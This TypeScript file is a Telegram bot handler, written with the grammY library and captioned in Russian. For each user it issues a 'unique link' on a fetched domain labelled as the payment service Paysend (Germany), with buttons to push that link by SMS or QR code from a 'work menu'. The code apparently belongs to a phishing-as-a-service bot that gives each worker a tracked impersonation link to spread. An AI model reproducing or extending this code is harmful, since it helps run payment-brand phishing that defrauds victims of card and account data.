import {Context} from "@/database/models/context";
import {Composer, InlineKeyboard} from "grammy";
import {getDomen} from "@/helpers/getDomen";

export const composer = new Composer<Context>()
composer.callbackQuery('paysend menu', handler)

const keyboard = new InlineKeyboard()
    .text("📲 SMS", `sms ad paysend`)
    .text("🎲 QR-code", `qrcode get paysend`)
    .row()
    .text('Назад', 'workMenu2.0')

export async function handler(ctx: Context)  {
    const domen = await getDomen(ctx.user,'paysend')
    if (!domen) return ctx.reply('domen undefined error')

    return ctx.editMessageCaption({
        caption: `
🆔 <b>Твой ID paysand: <code>${ctx.user.id}</code></b>
💡 <b>Платформа: [PAYSEND 🇩🇪]</b>

➖➖➖➖➖➖➖
🌠 <b>Твоя уникальная ссылка:</b> <a href="https://${domen.link}/link/paysend/${ctx.user.id}">LINK</a>
        `,
        reply_markup: keyboard
    })
}